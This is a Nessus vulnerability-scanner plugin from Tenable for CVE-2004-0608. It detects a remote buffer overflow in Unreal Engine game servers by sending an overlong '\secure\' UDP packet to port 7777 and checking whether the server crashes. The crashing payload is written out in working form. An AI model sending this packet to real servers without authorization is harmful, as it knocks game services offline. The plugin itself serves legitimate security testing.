#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12285);
 script_cve_id("CVE-2004-0608");
 script_bugtraq_id(10570);
 script_version ("$Revision: 1.5 $");

 name["english"] = "Unreal secure remote buffer overflow";

 script_name(english:name["english"]);

    desc["english"] = "
The remote host was running a game server with the Unreal Engine on it.

The game server is vulnerable to a remote attack which allows for 
arbitrary code execution.

*** Note that Nessus disabled this service by testing for this flaw.

Solution : Epic has released a patch for this issue.
Risk factor : High";


 script_description(english:desc["english"]);

 summary["english"] = "Crashes the remote Unreal Engine Game Server";

 script_summary(english:summary["english"]);

 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");

 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 exit(0);
}


port = 7777;
init = string("\\status\\");
malpacket = string("\\secure\\", crap(data:"a", length:1024) );

soc = open_sock_udp(port);

send(socket:soc, data:init);
r = recv(socket:soc, length:128);
if (r)
{
	send(socket:soc, data:malpacket);
	r = recv(socket:soc, length:128);
	if (! r)
	{
		security_hole(port);
		exit(0);
	}
}	
